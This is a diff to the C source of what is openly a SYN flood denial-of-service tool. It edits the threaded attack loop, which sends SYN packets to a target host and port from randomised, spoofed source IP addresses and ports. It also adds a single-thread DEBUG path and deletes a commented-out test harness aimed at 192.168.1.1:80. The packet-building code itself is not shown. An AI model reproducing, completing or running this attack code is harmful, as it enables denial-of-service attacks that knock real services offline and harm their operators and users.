@@ -19,7 +19,7 @@ extern void error(const char *fmt, ...);
 
 extern char *randip(char **buff);
 extern int randport(void);
-extern unsigned short checksum(unsigned short *ptr, int hlen, char *data); 
+extern unsigned short checksum(unsigned short *ptr, int hlen, char *data);
 
 static int _send_syn_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep)
 {
@@ -140,7 +140,12 @@ static void _attack_thread(pSFTP parameters)
     int dport = parameters->dport;
     int rep = parameters->rep;
 
-    // printf("thread say hi\n"); // debug use
+#ifdef DEBUG
+    char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
+    saddr = randip(&saddr);
+    int sport = randport();
+    _send_syn_packet(daddr, dport, saddr, sport, rep);
+#else
     if (parameters->random_saddr)
     {
         char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
@@ -162,6 +167,7 @@ static void _attack_thread(pSFTP parameters)
             _send_syn_packet(daddr, dport, saddr, sport, rep);
         }
     }
+#endif
 }
 
 int syn_flood_attack(char *url, int port, ...)
@@ -203,9 +209,11 @@ int syn_flood_attack(char *url, int port, ...)
     parameters->saddr = saddr;
     parameters->sport = sport;
 
+#ifndef DEBUG
     pthread_t tid_list[thread_number];
     pthread_attr_t attr;
     int ret;
+#endif
 
     if (strlen(url))
     {
@@ -219,7 +227,11 @@ int syn_flood_attack(char *url, int port, ...)
         error("please specify a target port");
     }
 
-    for (i = 0; i < thread_number; i++) // only one process
+#ifdef DEBUG
+    thread_number++; // meaningless operation, just to avoid warnings from gcc compilation
+    _attack_thread(parameters);
+#else
+    for (i = 0; i < thread_number; i++)
     {
         if (pthread_attr_init(&attr))
         {
@@ -244,19 +256,7 @@ int syn_flood_attack(char *url, int port, ...)
     {
         pthread_join(tid_list[i], NULL);
     }
+#endif
 
     return 0;
 }
-
-/*
-int main(void)
-{
-    // for test
-    pAllAttackParameter p = (pAllAttackParameter)malloc(sizeof(Input));
-    p->random_sip_address = ENABLE_SIP;
-    p->each_ip_repeat = 1024;
-    strcpy(p->address, "192.168.1.1:80");
-    SYNFloodAttack_Thread(p);
-    return 0;
-}
-*/
